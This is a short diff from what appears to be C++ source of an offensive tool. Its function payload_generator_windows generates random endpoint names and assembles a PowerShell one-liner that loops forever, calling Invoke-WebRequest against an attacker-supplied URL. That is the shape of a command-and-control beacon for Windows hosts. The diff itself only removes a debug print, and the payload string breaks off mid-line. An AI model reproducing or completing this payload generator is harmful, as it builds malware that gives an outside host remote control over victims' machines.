@@ -33,8 +33,6 @@ string payload_generator_windows(string url) {
     string endpoint1 = generate_random_string(8);
     string endpoint2 = generate_random_string(8);
 
-    cout << "Generated Endpoints: " << endpoint1 << " , " << endpoint2 << endl;
-
     // Construct the entire payload string in one line
     string payload =
     "while ($true) { try { $response = Invoke-WebRequest -Uri \"" + url + "/" + endpoint1 +
